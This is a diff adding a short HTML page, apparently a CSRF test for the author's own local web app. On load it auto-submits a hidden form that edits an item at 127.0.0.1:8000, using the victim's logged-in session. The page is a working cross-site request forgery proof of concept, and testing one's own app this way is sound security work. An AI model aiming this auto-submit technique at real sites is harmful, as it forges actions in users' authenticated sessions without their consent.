@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!--
+To run this CSRF test, drag the html onto the same browser
+and tab where you've already authenticated with the application
+
+The form will automatically submit and try to create a Chicken in the Car category
+with a description that it is a dog that goes woof :S
+-->
+
+<head>
+    <meta charset="UTF-8">
+    <title>A simple attack! Mwahaha...</title>
+</head>
+
+<body onload="document.forms[0].submit()">
+
+    <form action="http://127.0.0.1:8000/items/0/edit" method="POST" >
+                <input class="form-control" name="title" value="Chicken"
+                       >
+                <textarea name="description"
+                          >This is a dog that goes woof</textarea>
+                <select class="form-control" name="category">
+                            <option value="1" selected>whatever</option>
+                </select>
+    </form>
+
+</body>
+</html>
